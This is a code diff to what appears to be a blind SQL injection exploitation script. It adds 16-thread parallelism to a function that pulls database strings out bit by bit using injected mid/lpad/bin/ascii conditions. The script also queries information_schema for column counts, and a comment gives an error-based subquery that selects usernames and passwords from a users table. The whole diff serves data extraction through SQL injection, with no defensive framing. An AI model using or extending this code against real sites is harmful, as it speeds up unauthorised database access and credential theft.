@@ -1,6 +1,9 @@
 from __future__ import print_function
 
 import re, os, sys
+import parallel
+
+THREAD_N = 16
 
 def get_cols(table, template, fn, get_str):
     query = '(select COUNT(column_name) from information_schema.columns where table_name="%s")' % (table)
@@ -54,14 +57,16 @@ def get_string(template, val, func):
 
     wtemp = 'mid(lpad(bin(ascii(mid(%s, {0}, 1))), 8, "0"), %d, 1) = %s'
     print('\r' + '_' * length, end='')
-    output = ''
-    for j in range(length):
+    output = dict()
+    def _(obj):
+        (i, j) = obj
         _ascii = binary_search(func, template % wtemp.format(j+1), val, 8)
-        output += chr(_ascii)
-        print('\r' + output + '_' * (length-j-1), end='')
+        output[i] = chr(_ascii)
+        print('\r' + ''.join(output.get(_i, '_') for _i in range(length)), end='')
         sys.stdout.flush()
+    parallel.run(_, enumerate(range(length)), thread_num=max(1, min(THREAD_N, length//2)))
     print()
-    return output
+    return ''.join(output.get(_i, '_') for _i in range(length))
 
 # error-based sqli
 # subq example: select concat_ws(',', username, password) from users limit 1 offset 0
